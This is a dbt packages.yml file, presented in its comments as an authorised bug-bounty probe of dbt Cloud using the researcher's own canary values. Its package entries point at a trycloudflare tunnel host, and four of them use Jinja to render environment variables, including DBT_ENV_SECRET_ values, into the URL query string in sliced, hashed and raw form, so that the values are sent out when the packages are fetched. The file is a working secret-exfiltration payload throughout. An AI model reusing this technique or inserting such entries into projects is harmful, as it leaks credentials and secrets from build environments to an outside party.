# Benign security-research probe, run 3. nonce c8d454cee4c3
# Authorised testing of dbt Cloud under the dbt Labs bug bounty programme.
# Every canary value below is OURS. No dbt Labs credential is referenced here.
packages:
  # s0 BENIGN CONTROL -- no Jinja at all. Establishes config-was-read separately
  #    from any claim about what authority the renderer forwards.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/s0-control?n=c8d454cee4c3&rung=s0"
    name: l145d9_s0_control

  # s1 PLAIN-band canary, IDENTITY only. Plumbing control: proves an account-set
  #    project env var reaches this renderer at all.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/s1-plainband?n=c8d454cee4c3&rung=s1{% set _p = env_var('DBT_L145D9_PLAIN_CANARY','') %}&PB_p={{ _p[0:5] }}&PB_l={{ _p | length }}&PB_h={{ local_md5(_p)[0:10] if local_md5 is defined else 'nomd5' }}"
    name: l145d9_s1_plainband

  # s2 SECRET-band canary through a Jinja FILTER. Source says Jinja sees only a
  #    placeholder here, so this must report 70, not 32.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/s2-secretband-len?n=c8d454cee4c3&rung=s2&SBLEN={{ env_var('DBT_ENV_SECRET_L145D9_CANARY','') | length }}&SBPFX={{ (env_var('DBT_ENV_SECRET_L145D9_CANARY','') | string)[0:22] | urlencode }}"
    name: l145d9_s2_secretband_len

  # s3 SECRET-band canary RAW. Source says SecretRenderer substitutes the real
  #    value into the finished string after rendering -- so the canary itself
  #    should arrive, which is the whole point: this band CANNOT be identity-
  #    filtered by a researcher, only exfiltrated whole.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/s3-secretband-raw?n=c8d454cee4c3&rung=s3&SBRAW={{ env_var('DBT_ENV_SECRET_L145D9_CANARY','') }}"
    name: l145d9_s3_secretband_raw

  # s4 NEGATIVE CONTROL -- a DBT_ENV_SECRET_ name that does not exist. Must be 0
  #    and must not abort the step.
  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/s4-absent?n=c8d454cee4c3&rung=s4&ABSLEN={{ env_var('DBT_ENV_SECRET_L145D9_ABSENT_CONTROL','') | length }}"
    name: l145d9_s4_absent
